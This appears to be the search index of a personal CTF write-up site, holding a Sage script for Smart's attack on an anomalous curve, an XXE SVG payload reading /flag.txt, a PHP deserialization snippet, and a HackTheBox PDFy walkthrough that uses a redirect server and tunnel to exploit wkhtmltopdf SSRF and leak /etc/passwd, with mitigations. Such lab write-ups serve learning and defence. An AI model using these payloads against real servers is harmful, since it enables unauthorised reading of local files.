{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"CTF Writeups Collection","text":"<p>Welcome to my collection of Capture The Flag (CTF) challenge writeups. This site documents my journey through various cybersecurity challenges, detailing the techniques, tools, and thought processes used to solve them.</p>"},{"location":"#latest-writeups","title":"\ud83c\udfc6 Latest Writeups","text":"<ul> <li>PDFy (HTB Web Challenge) - Exploiting an SSRF vulnerability in wkhtmltopdf</li> <li>Coming soon... - More writeups on the way!</li> </ul>"},{"location":"#categories","title":"\ud83d\udd0d Categories","text":"<ul> <li>Web Exploitation - Web application vulnerabilities and exploitation techniques</li> <li>Binary Exploitation - Buffer overflows, ROP chains, and other binary exploitation methods</li> <li>Reverse Engineering - Analyzing and understanding compiled programs</li> <li>Cryptography - Breaking cryptographic implementations</li> <li>Miscellaneous - Other interesting challenges</li> </ul>"},{"location":"#tools-frequently-used","title":"\ud83d\udee0\ufe0f Tools Frequently Used","text":"<ul> <li>Web: Burp Suite, wfuzz, dirsearch, SQLmap</li> <li>Binary Exploitation: GDB, pwntools, checksec</li> <li>Reverse Engineering: Ghidra, IDA Pro, Radare2</li> <li>Cryptography: CyberChef, OpenSSL, custom scripts</li> <li>General: Python, Wireshark, Linux command line tools</li> </ul>"},{"location":"#about-me","title":"\ud83d\udd12 About Me","text":"<p>I'm a cybersecurity enthusiast focusing on offensive security. These writeups serve as both a personal reference and a resource for others in the community.</p>"},{"location":"#connect-with-me","title":"Connect With Me","text":"<ul> <li>GitHub: tryptoph</li> <li>HTB Profile </li> <li>CTFtime Profile</li> </ul>"},{"location":"boxes/","title":"Boxes","text":""},{"location":"crypto/","title":"Cryptography","text":""},{"location":"crypto/ECC%20challenge/","title":"Here a detailed solve for the challenge I created for finals of Cyber Warfare Odyssey CTF (CWO)","text":"<ul> <li> <p>The idea idea is to exploit the anomalous curve(oder of curve = Field prime) using SMART ATTACK</p> </li> <li> <p>sagamath makes it easy thanks to pre-built functions :</p> </li> </ul> <pre><code># Solution for Smart's Anomaly Challenge\nfrom hashlib import sha256\n\n# Load parameters from the challenge\np = 0x2a33eae8e041ce736c68a23f74b553ff0e87e87c9f9ece310ea5cd2cff994fc101574742780e1d8a7c3caab975f193c26c0839c513d4a68da22a290ae446517997595a3885c3e07c8795bf40cd8e835a5802df1e1eda7f39479c245e7f69\na = 0x234be835278a201355f21b900e2840f608be2674d63cccd453bc1b5f8dd865301b11fd70394e9c30bef3195e3fbcc5204f92080882ef59abbc9f28ff20968f990a4f60b789d48824353c26c814ec36ec19d10f0add7ac79f2727a1ba25f7\nb = 0x223567f05cc456a0d10d34bb2ac676fdbbdd8e8b6536f2f0905e4b6c7d480974c75a7b33c7a9c9b3bb59639f53078881caed73d9163aa556a4d98a9d5a1e4eb22c3ce3c13911d59fd37a07654e459dd3685526f863d31d7b557d46302212\n\n# Define the curve over Fp\nF = GF(p)\nE = EllipticCurve(F, [a, b])\n\n# Check if the curve is anomalous\ncurve_order = E.order()\nprint(f\"Curve order: {curve_order}\")\nprint(f\"Field prime: {p}\")\nprint(f\"Is anomalous: {curve_order == p}\")\n\n# Base point G and public key Q\nG_x = 0x098a558ab508f35e128644b308c1b585e5d398d05301500f83c862058faaa7630d3da1f70d2540481ccc5e844df7f690d68906ada79a573306ae648363c3089e23af43056f06e7ad75e784bbe3088cf3b2a34bc7f2cf895555c7c7322e2d\nG_y = 0x0a727be8dcc3ad7a6423657df9c03a4ccb307a66f9116422b76028768ae4d48170f846a3141d7a51525b9ee675a4a4adc1a91b9e6459c56aa39e6c38d5beb84f12ff38096575a6634d6b7e085a277821afa0634669958ee42729f70646d0\nG = E(G_x, G_y)\n\nQ_x = 0x227fb21da7b9821532bf33b355250ab1b0c21aa35035f31ea4f2f490c5a6939d7b02e9df58dfe299bb87dee42a067586cce6322a9291ad855995efbf52b0cc7c84c77b48af0de259608ef5e4109bad38ce5b998c9a3218e84f1c179dbade\nQ_y = 0x10e015f3c30414c16dcebfae6fbccc341208106af5e22f7efad4429b0181220fb97bcc3251ef765c5296d67d68299b3f46b818eead484faf55f0668c7c02780c55dc3fe2ce60addc6435dc7ad43b0af6a4502038ba3b63869c6cbe71afaa\nQ = E(Q_x, Q_y)\n\n# Ephemeral point C1\nC1_x = 0x13b3ff44d3a92be5d4621ad5c617ea66067cf302bc9a1b98d2e47250742571fcb6c37a7e4cbd724fb604b4fe9e15fd7077432ce1c5be2270dbd0f771acfb86bdb312a10752979d085f74f8d66bcb1a92c367e458d7b513eca5118f1a7237\nC1_y = 0x212ec8897fb82b9cb3e4d026a7944c3c019ee9a8142db3bfc581209efc078aa21c9fe87dd39d3145fc5459d540f1fe11f2d14b97e93b730c7e9954f96ba36cdb8fc29a15a44f55c55116db6b24675d0cb4425d6d8df13ba31d81a0cdef43\nC1 = E(C1_x, C1_y)\n\nencrypted_flag = \"669ef85c6f35a0dc88a74a55465adaf728f972ab2b93d465660bb7c384b4fd8f7082c37a59139094a8954f546d01b59c16bd2dfb61b1\"\n\n# Step 1: Implement Smart's attack to find private key d\nprint(\"\\n=== Implementing Smart's attack ===\")\nprint(\"Smart's attack exploits the weakness in anomalous curves (where #E(Fp) = p)\")\nprint(\"by lifting the problem to p-adic numbers where discrete log is easy.\\n\")\n\ndef smart_attack(P, Q, p):\n    \"\"\"\n    Solve the ECDLP for anomalous curves where #E(F_p) = p\n    Returns d such that Q = d*P\n    \"\"\"\n    print(\"1. Lifting curve and points to p-adic numbers...\")\n    # Construct the curve over Q_p (p-adics)\n    E_Qp = EllipticCurve(Qp(p, 2), [a, b])\n\n    # Lift points to p-adics\n    print(\"2. Finding valid p-adic lifts of the points...\")\n    P_Qp_points = E_Qp.lift_x(ZZ(P.xy()[0]), all=True)\n    for point in P_Qp_points:\n        if GF(p)(point.xy()[1]) == P.xy()[1]:\n            P_lift = point\n            break\n\n    Q_Qp_points = E_Qp.lift_x(ZZ(Q.xy()[0]), all=True)\n    for point in Q_Qp_points:\n        if GF(p)(point.xy()[1]) == Q.xy()[1]:\n            Q_lift = point\n            break\n\n    print(\"3. Computing p*P and p*Q in the formal group...\")\n    # Compute p*P and p*Q in E(Q_p)\n    pP = p*P_lift\n    pQ = p*Q_lift\n\n    print(\"4. Extracting the discrete log from the p-adic logarithm...\")\n    # Extract the discrete log from the p-adic logarithm\n    # We're using the fact that in the formal group:\n    # log(p*Q) = d*log(p*P)\n    x_P, y_P = pP.xy()\n    x_Q, y_Q = pQ.xy()\n\n    # The formal logarithm maps to the additive group\n    # using the negative of the x/y coordinate\n    phi_P = -(x_P/y_P)\n    phi_Q = -(x_Q/y_Q)\n\n    # Solve for discrete log: phi_Q = d * phi_P\n    d = phi_Q / phi_P\n\n    return ZZ(d)\n\ntry:\n    # Run Smart's attack to find the private key\n    d = smart_attack(G, Q, p)\n    print(f\"\\nRecovered private key d = {d}\")\n\n    # Verify the result\n    if d * G == Q:\n        print(\"Verification successful: d*G = Q\")\n    else:\n        print(\"Attack failed: d*G != Q\")\n        exit(1)\n\n    # Compute the shared secret\n    print(\"\\n=== Computing shared secret ===\")\n    shared_secret = d * C1  # d * (k * G) = k * (d * G) = k * Q\n    print(f\"Shared secret = ({hex(shared_secret[0])}, {hex(shared_secret[1])})\")\n\n    # Derive the encryption key\n    print(\"\\n=== Deriving encryption key ===\")\n    h = sha256((str(shared_secret[0]) + str(shared_secret[1])).encode())\n    key_hex = h.hexdigest()\n    key_bytes = bytes.fromhex(key_hex)\n\n    # Decrypt the flag\n    print(\"\\n=== Decrypting the flag ===\")\n    encrypted_bytes = bytes.fromhex(encrypted_flag)\n    decrypted_bytes = bytearray()\n\n    for i in range(len(encrypted_bytes)):\n        # XOR using bitwise operations\n        a = int(encrypted_bytes[i])\n        b = int(key_bytes[i % len(key_bytes)])\n        # Manual XOR implementation: a XOR b\n        xor_result = (a | b) - (a &amp; b)\n        decrypted_bytes.append(xor_result)\n\n    flag = bytes(decrypted_bytes).decode()\n    print(f\"\\nDecrypted flag: {flag}\")\n\nexcept Exception as e:\n    print(f\"Attack failed: {e}\")\n</code></pre>"},{"location":"misc/","title":"Miscellaneous Challenges","text":""},{"location":"pwn/","title":"Binary Exploitation","text":""},{"location":"pwn/freepoint%20enset%20pwn/","title":"Freepoint enset pwn","text":""},{"location":"reverse/","title":"Reverse Engineering","text":""},{"location":"web/","title":"Web Challenges","text":""},{"location":"web/enset%201/","title":"Enset 1","text":"<p>N7CHALL{XXE_VIA_SVG_SKHOOOONA}</p> <p></p> <p>i tried this :</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM \"file:///flag.txt\"&gt; ]&gt;\n&lt;svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\"&gt;\n  &lt;text x=\"10\" y=\"20\"&gt;&amp;xxe;&lt;/text&gt;\n&lt;/svg&gt;\n</code></pre>"},{"location":"web/enset%202/","title":"Enset 2","text":"<p>PHP serialization vulnerability challenge</p> jackpot = \"11 22 33 44 55 66\"; // any numbers you choose $obj-&gt;enter = \"11 22 33 44 55 66\";   // must match jackpot  // Normal serialization $serialized = serialize($obj); echo \"Normal serialization: \".$serialized.\"\\n\";  // Manipulate the object count $exploit = str_replace('O:10:\"LotteryBox\":2', 'O:10:\"LotteryBox\":3', $serialized); echo \"Exploit payload: \".$exploit.\"\\n\";  // Base64 encode $encoded = base64_encode($exploit); echo \"Base64 encoded: \".$encoded.\"\\n\"; ?&gt;"},{"location":"web/pdfy/","title":"HackTheBox PDFy Web Challenge - Complete Writeup","text":""},{"location":"web/pdfy/#challenge-overview","title":"Challenge Overview","text":"<p>Name: PDFy Category: Web Difficulty: Easy Description:</p> <p>Welcome to PDFy, the exciting challenge where you turn your favorite web pages into portable PDF documents! It's your chance to capture, share, and preserve the best of the internet with precision and creativity. Join us and transform the way we save and cherish web content! NOTE: Leak /etc/passwd to get the flag!</p>"},{"location":"web/pdfy/#technical-background","title":"Technical Background","text":""},{"location":"web/pdfy/#the-vulnerability","title":"The Vulnerability","text":"<p>PDFy is vulnerable to Server-Side Request Forgery (SSRF) due to its utilization of the wkhtmltopdf library. The challenge explicitly tells us we need to leak the contents of <code>/etc/passwd</code> to get the flag, indicating this is likely an SSRF challenge.</p>"},{"location":"web/pdfy/#what-is-wkhtmltopdf","title":"What is wkhtmltopdf?","text":"<p>wkhtmltopdf is a command-line tool that renders HTML into PDF documents using the Qt WebKit rendering engine. It's commonly used in web applications that need to generate PDF reports or document conversions.</p> <p>you can see it in app by entering a wrong url : </p> <p></p>"},{"location":"web/pdfy/#the-vulnerability-cve-2022-35583","title":"The Vulnerability (CVE-2022-35583)","text":"<p>wkhtmltopdf has a known vulnerability (CVE-2022-35583) where it follows HTTP redirects to <code>file://</code> URIs without appropriate validation. This allows attackers to redirect requests to local files, which can lead to information disclosure.</p>"},{"location":"web/pdfy/#reconnaissance","title":"Reconnaissance","text":"<p>Upon accessing the application, we see a simple interface allowing users to convert web pages to PDFs:</p> <p></p> <ol> <li>The user inputs a URL</li> <li>The application fetches that URL and renders it to a PDF using wkhtmltopdf</li> <li>The PDF is stored at <code>/static/pdfs/[filename].pdf</code> and made available for download</li> </ol> <p>Through initial testing with legitimate URLs (like google.com), we can see the application successfully converts webpages to PDFs.</p> <p></p>"},{"location":"web/pdfy/#analyzing-the-application","title":"Analyzing the Application","text":"<p>By examining the application behavior, we can determine:</p> <ol> <li>The application accepts a URL as input via a JSON payload with a <code>url</code> field</li> <li>It passes this URL to wkhtmltopdf for rendering</li> <li>Error messages reveal the use of wkhtmltopdf in the backend</li> <li>The application doesn't appear to have proper URL validation</li> </ol>"},{"location":"web/pdfy/#exploitation-strategy","title":"Exploitation Strategy","text":"<p>The exploitation strategy involves:</p> <ol> <li>Creating a web server that responds with a redirect to <code>file:///etc/passwd</code></li> <li>Making the PDFy application request our malicious server</li> <li>wkhtmltopdf will follow the redirect to the local file</li> <li>The contents of <code>/etc/passwd</code> will be included in the generated PDF</li> </ol>"},{"location":"web/pdfy/#detailed-exploitation-steps","title":"Detailed Exploitation Steps","text":""},{"location":"web/pdfy/#step-1-create-a-redirect-server","title":"Step 1: Create a Redirect Server","text":"<p>We set up a simple HTTP server that redirects all requests to <code>file:///etc/passwd</code>. Since PHP wasn't available in my local, we used Python:</p> <pre><code>import http.server\nimport socketserver\n\nclass RedirectHandler(http.server.SimpleHTTPRequestHandler):\n    def do_GET(self):\n        print(\"Received request - redirecting to file:///etc/passwd\")\n        self.send_response(302)\n        self.send_header(\"Location\", \"file:///etc/passwd\")\n        self.end_headers()\n\nPORT = 8081\nHandler = RedirectHandler\n\nwith socketserver.TCPServer((\"\", PORT), Handler) as httpd:\n    print(f\"Server running at port {PORT}\")\n    httpd.serve_forever()\n</code></pre> <p>This server listens on port 8081 and responds to all GET requests with a 302 redirect to <code>file:///etc/passwd</code>.</p> <p></p>"},{"location":"web/pdfy/#step-2-expose-the-local-server-to-the-internet","title":"Step 2: Expose the Local Server to the Internet","text":"<p>Since our server is running locally, we need to make it accessible to the PDFy application. We used localhost.run to create a secure tunnel:</p> <pre><code>ssh -R 80:localhost:8081 nokey@localhost.run\n</code></pre> <p>This command creates a tunnel that forwards traffic from a public URL (provided by localhost.run) to our local server on port 8081. In our case, we received the URL <code>https://9ba152a3947672.lhr.life</code>.</p> <p></p>"},{"location":"web/pdfy/#step-3-submit-the-malicious-url-to-pdfy","title":"Step 3: Submit the Malicious URL to PDFy","text":"<p>We submitted our public URL (<code>https://9ba152a3947672.lhr.life</code>) to the PDFy application.</p> <p></p>"},{"location":"web/pdfy/#step-4-pdfy-processes-the-request","title":"Step 4: PDFy Processes the Request","text":"<p>When PDFy receives our URL:</p> <ol> <li>It passes the URL to wkhtmltopdf for rendering</li> <li>wkhtmltopdf sends a GET request to our server</li> <li>Our server responds with a 302 redirect to <code>file:///etc/passwd</code></li> <li>wkhtmltopdf follows this redirect and attempts to render the local file</li> <li>The contents of <code>/etc/passwd</code> are included in the generated PDF</li> </ol> <p></p>"},{"location":"web/pdfy/#step-5-download-and-view-the-pdf","title":"Step 5: Download and View the PDF","text":"<p>After the PDFy application generates the PDF, we download and open it. The PDF contains the contents of <code>/etc/passwd</code> from the target server, including the flag</p> <p></p>"},{"location":"web/pdfy/#technical-explanation-of-the-vulnerability","title":"Technical Explanation of the Vulnerability","text":"<p>The vulnerability exists because:</p> <ol> <li>Improper URL Validation: The application doesn't validate or sanitize the URL input</li> <li>Redirect Handling: wkhtmltopdf follows HTTP redirects without proper validation</li> <li>Protocol Handling: wkhtmltopdf allows access to the <code>file://</code> URI scheme, which should never be accessible from a web-driven PDF generator</li> </ol> <p>When wkhtmltopdf follows a redirect to a <code>file://</code> URI, it attempts to read the file from the local filesystem of the server running the wkhtmltopdf process. This allows attackers to read sensitive files from the server.</p> <p></p>"},{"location":"web/pdfy/#alternative-exploitation-approaches","title":"Alternative Exploitation Approaches","text":""},{"location":"web/pdfy/#using-php-if-available","title":"Using PHP (if available)","text":"<pre><code>&lt;?php\nheader(\"Location: file:///etc/passwd\");\n?&gt;\n</code></pre>"},{"location":"web/pdfy/#using-iframes-also-effective","title":"Using iframes (also effective)","text":"<p>An alternative approach would be to use an iframe in HTML:</p> <pre><code>&lt;iframe src=\"http://your-server/redirect.php?x=/etc/passwd\" width=\"1000px\" height=\"1000px\"&gt;&lt;/iframe&gt;\n</code></pre> <p>Where <code>redirect.php</code> contains:</p> <pre><code>&lt;?php \nheader('location:file://'.$_REQUEST['x']); \n?&gt;\n</code></pre>"},{"location":"web/pdfy/#mitigation-recommendations","title":"Mitigation Recommendations","text":"<p>To prevent this type of vulnerability, developers should:</p> <ol> <li>Implement URL Validation: Only allow specific URL schemes (http, https) and domains</li> <li>Disable File Protocol: Explicitly disable the <code>file://</code> protocol in wkhtmltopdf with the <code>--disable-local-file-access</code> flag</li> <li>Use a Whitelist Approach: Only allow conversion of URLs from trusted domains</li> <li>Update Libraries: Keep wkhtmltopdf and other dependencies updated to patched versions</li> <li>Run in Isolation: Run the PDF generation process in a containerized environment with minimal privileges</li> </ol>"},{"location":"web/pdfy/#lessons-learned","title":"Lessons Learned","text":"<ol> <li>Always Validate User Input: Any user-controlled input that affects server-side operations must be properly validated and sanitized</li> <li>Understand Your Tools: Understanding the security implications of libraries like wkhtmltopdf is critical</li> <li>Protocol Security: Special attention should be paid to applications that handle multiple URL protocols</li> <li>Defense in Depth: Multiple layers of protection are needed when dealing with user-controlled URLs</li> </ol>"},{"location":"web/pdfy/#conclusion","title":"Conclusion","text":"<p>The PDFy challenge demonstrates a common vulnerability in web applications that generate PDFs from HTML content. By exploiting the SSRF vulnerability in wkhtmltopdf, we were able to read sensitive files from the target server and obtain the flag.</p> <p>This type of vulnerability is particularly dangerous because it can lead to information disclosure, internal network scanning, and potentially remote code execution. Understanding how to identify and exploit such vulnerabilities is crucial for web application security testing.</p>"},{"location":"web/pdfy/#appendix-references","title":"Appendix: References","text":"<ul> <li>CVE-2022-35583 - wkhtmltopdf vulnerability details</li> <li>wkhtmltopdf SSRF - Exploit documentation</li> <li>HackTheBox PDFy Challenge - Original challenge (requires HTB account)</li> <li>localhost.run - Tool used for exposing local server</li> </ul>"}]}